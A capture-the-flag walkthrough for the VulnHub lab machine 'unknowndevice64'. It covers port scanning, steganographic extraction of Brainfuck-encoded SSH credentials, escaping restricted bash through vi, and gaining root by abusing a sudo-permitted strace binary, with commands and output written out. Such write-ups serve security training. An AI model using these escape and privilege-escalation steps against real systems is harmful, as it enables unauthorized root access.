# unknowndevice64  
  
**URL: https://www.vulnhub.com/entry/unknowndevice64-1,293/**  
  
### NMAP  
  
root@kali:~# nmap -p- -A 192.168.111.3  
>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-17 04:32 CDT  
>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
>Nmap scan report for 192.168.111.3  
>Host is up (0.00055s latency).  
>Not shown: 999 closed ports  
>PORT      STATE SERVICE VERSION  
>1337/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)  
>| ssh-hostkey:   
>|   2048 b9:af:04:6d:f1:8c:59:3a:d6:e1:96:b7:f7:fc:57:83 (RSA)  
>|   256 12:68:4c:6b:96:1e:51:59:32:8a:3d:41:0d:55:6b:d2 (ECDSA)  
>|_  256 da:3e:28:52:30:72:7a:dd:c3:fb:89:7e:54:f4:bb:fb (ED25519)  
>31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)  
>|_http-title:    Website By Unknowndevice64     
>MAC Address: 08:00:27:36:D1:DD (Oracle VirtualBox virtual NIC)  
>Device type: general purpose  
>Running: Linux 3.X|4.X  
>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
>OS details: Linux 3.2 - 4.9  
>Network Distance: 1 hop  
  
### HTTP  
  
Checking the source code of the html page we find this clue:  
  
"Not a visible enthusiasm but a <span style="color:red">h1dd3n</span> one, an excitement burning with a cold flame."  
  
And a comment:  
  
\<!-- key_is_h1dd3n.jpg --\>  
  
It is an image with just the following message:  
  
>HIDDEN SECRETS  
  
Let's download it and play a little:  
  
root@kali:~# wget hxxp://192.168.111.3:31337/key_is_h1dd3n.jpg  
>--2019-04-17 04:37:27--  hxxp://192.168.111.3:31337/key_is_h1dd3n.jpg  
>Connecting to 192.168.111.3:31337... connected.  
>HTTP request sent, awaiting response... 200 OK  
>Length: 5386 (5.3K) [image/jpeg]  
>Saving to: ‘key_is_h1dd3n.jpg’  
>  
>key_is_h1dd3n.jpg                     100%[========================================================================>]   5.26K  --.-KB/s    in 0s        
>  
>2019-04-17 04:37:27 (365 MB/s) - ‘key_is_h1dd3n.jpg’ saved [5386/5386]  
  
Let's try to extract a message with the previous clue:  
  
root@kali:~# steghide extract -sf key_is_h1dd3n.jpg -p h1dd3n  
>wrote extracted data to "h1dd3n.txt".  
  
root@kali:~# cat h1dd3n.txt   
> ++++++++++\[>+>+++>+++++++>++++++++++<<<<-\]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.  
  
Easy. It looks like brainfuck code. Decodeing the file we get credentials:  
  
>ud64:1M!#64@ud  
  
### SSH  
  
We log in the ssh using the credentials we just got:  
  
root@kali:~# ssh -l ud64 -p 1337 192.168.111.3  
>The authenticity of host '[192.168.111.3]:1337 ([192.168.111.3]:1337)' can't be established.  
>ECDSA key fingerprint is SHA256:i17eNafYZbuhnBTVOd3NGK7az/9ZPgwR8GQzqGenV9g.  
>Are you sure you want to continue connecting (yes/no)? yes  
>Warning: Permanently added '[192.168.111.3]:1337' (ECDSA) to the list of known hosts.  
>ud64@192.168.111.3's password:   
>Last login: Mon Dec 31 08:37:58 2018 from 192.168.56.101  
  
ud64@unknowndevice64_v1:~$ id  
>uid=1000(ud64) gid=1000(ud64) groups=1000(ud64)  
  
### Breaking out  
  
ud64@unknowndevice64_v1:~$ hostname  
>-rbash: hostname: command not found  
  
Great, a restricted bash shell... Let's see what we can doo...  
  
ud64@unknowndevice64_v1:~$ echo $PATH  
>/home/ud64/prog  
  
ud64@unknowndevice64_v1:~$ cd   
>.bash_history  .bash_profile  .config/       .screenrc      Desktop/       Documents/     Downloads/     Music/         Pictures/      Public/        Videos/        prog/          web/    
  
ud64@unknowndevice64_v1:~$ cd prog/  
>date    id      vi      whoami    
  
So we can open a text editor. It should be easy to break through:  
  
ud64@unknowndevice64_v1:~$ vi test  
  
We type :!/bin/bash  
  
bash-4.4$ id  
>uid=1000(ud64) gid=1000(ud64) groups=1000(ud64)  
  
bash-4.4$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
  
### Privilege escalation  
  
What could we do with sudo privileges?  
  
bash-4.4$ sudo -l  
>User ud64 may run the following commands on unknowndevice64_v1:  
>    (ALL) NOPASSWD: /usr/bin/sysud64  
  
What is sysud64?  
  
bash-4.4$ /usr/bin/sysud64 -h 
>usage: strace [-CdffhiqrtttTvVwxxy] [-I n] [-e expr]...  
>              [-a column] [-o file] [-s strsize] [-P path]...  
>              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]  
>   or: strace -c[dfw] [-I n] [-e expr]... [-O overhead] [-S sortby]  
>              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]  
  
Okay, it's just "strace". Let's try it out. Just remember to put the -o flag to silence the output.  
  
bash-4.4$ sudo /usr/bin/sysud64 -o /dev/null id  
>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)  
  
  
Now we open a shell and profit ^^  
  
bash-4.4$ sudo /usr/bin/sysud64 -o /dev/null /bin/bash  
root@unknowndevice64_v1:/home/ud64# id  
>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)  
  
root@unknowndevice64_v1:~# md5sum /root/flag.txt   
>0ff8fb9017a986916260a436371ed330  /root/flag.txt  
